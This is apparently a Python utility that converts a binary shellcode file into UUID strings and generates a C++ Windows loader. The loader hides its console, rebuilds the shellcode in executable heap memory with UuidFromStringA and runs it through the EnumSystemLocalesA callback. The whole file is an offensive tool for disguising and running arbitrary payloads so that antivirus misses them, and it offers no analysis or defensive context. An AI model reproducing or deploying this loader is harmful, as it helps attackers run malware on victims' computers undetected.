#Programed by a1phaboy
#python3 bin2uuid.py payload.bin

from uuid import UUID
import os
import sys

with open(sys.argv[1], "rb") as f:
    bin = f.read()

offset = 0
out = ""

while(offset < len(bin)):
    countOfBytesToConvert = len(bin[offset:])
    if countOfBytesToConvert < 16:
        ZerosToAdd = 16 - countOfBytesToConvert
        byteString = bin[offset:] + (b'\x00'* ZerosToAdd)
        uuid = UUID(bytes_le=byteString)
    else:
        byteString = bin[offset:offset+16]
        uuid = UUID(bytes_le=byteString)
    offset+=16

    out += "    \"{}\",\n".format(uuid)

context = ''' 
#include <stdio.h>  
#include <windows.h>
#include <rpc.h>
#pragma comment(lib,"Rpcrt4.lib")
            
const char* uuids[] ;
        
int main()
{
    FreeConsole();
    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* ha = HeapAlloc(hc, 0, 0x100000);
    DWORD_PTR hptr = (DWORD_PTR)ha;
    int elems = sizeof(uuids) / sizeof(uuids[0]);
    
    for (int i = 0; i < elems; i++) {
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);
        if (status != RPC_S_OK) {
            printf("UuidFromStringA() != S_OK");
            CloseHandle(ha);
            return -1;
        }
         hptr += 16;
    }
    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
    CloseHandle(ha);
    return 0;
}
'''
shellcodes = "uuids[] = {\n" + out + "}"
payload = context.replace('uuids[]', shellcodes, 1)

with open(sys.argv[1][:-4] + ".cpp", 'w+') as f:
    f.write(payload)